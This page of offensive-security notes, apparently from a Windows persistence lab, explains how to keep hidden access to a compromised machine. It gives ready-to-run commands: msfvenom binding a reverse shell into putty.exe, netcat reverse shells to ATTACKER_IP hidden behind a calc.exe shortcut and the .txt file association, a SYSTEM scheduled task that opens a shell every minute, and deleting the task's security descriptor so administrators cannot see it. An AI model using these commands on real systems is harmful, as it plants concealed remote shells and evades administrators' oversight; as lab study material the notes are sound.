---
layout: default
title:  "Abusing Executables"
weight: 2
type: docs
---
## Executable Files

As we have the initial foot hold on the system we can use this method for local persistence with executable file's infecting users ```.exe``` file's.

For this example we will be using PUTTY.exe, with the help of msfvenom 

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

You can download the legit executable and bind it with the backdoor code.

## Shortcut Files

The method which we will be using, is by editing the shortcut files of the legit executables which will be pointing to our malicious powershell script (ps1).

Hear we have target shortcut, called ```calc.exe```, by opeaning properties for that shortcut we can see the Target field, which is where we will be placing our pointer for our malicious script.

![image](../../images/backdoorinf_files_calc_properties.png)

The script which we will be executing is consist of our payload for now ```nc64.exe``` and the path to legit ```calculator.exe```, This will do 2 following things.

- First executing out malicious code withou any window.

- Secondly Running our legit executable.

```shell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

And lastly we will be pointing ```target``` to 

```shell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![image](../../images/backdoorinf_files_calc_properties2.png)

## Hijacking File Associations

Hijacking File Associations is an intresting one so far as its involves editing regestries, The main concept behind this is like wherever a user try to open a hijacked file association like **txt** the operating system will be forced to run our malicious code.

But its not limited to a a specific file it includes user-level modification meaning, whenever user opens a file including a association like **txt** it will run our malicious code.

The system File Associations are found under ```HKLM\Software\Classes\``` as shown in image below.

![image](../../images/Hijacking_File_Associations_1.png)

Hear we are targeting file association **.txt**, and after navigating to it's **ProgID** we can see the command which run's while opening any text file.

![image](../../images/Hijacking_File_Associations_2.png)

In the commad ```%SystemRoot%\system32\NOTEPAD.EXE %1``` where `%1` represents the name of the opened file, basically its and argument. 

Hear we will change the path to our malicoius backdoorscript.ps1 which will include as followed 

```shell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Where 

- $args[0]$ is an argument for the targets text file

- The malicious code is same as used in other methods so far.

![image](../../images/Hijacking_File_Associations_3.png)

If good so far, we have done and execution of any  ```.txt``` file will lead to a shell.

## Scheduled Task's

Hear we will be abusing the schedule task feature provided by windows, by create and hiding the task from user. With the help of widows built in tools u can create a scheduled task, hear we are creating one with the following

- name = THM-TaskBackdoor

- this will run every minute

- and run as SYSTEM

We can create it by the following command     

```shell
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.


C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

As u can see we have created one, but we need to hide if from the user to do so, u can navigate to ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\``` by using psexec tools 

```shell
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

![image](../../images/sch_task_per.png)

After u have the following window u can DELETE the security discriptor as security descriptor is simply an ACL that states which users have access to scheduled task.

If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

After deleting **SD** try to query and it should return 

```shell
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```


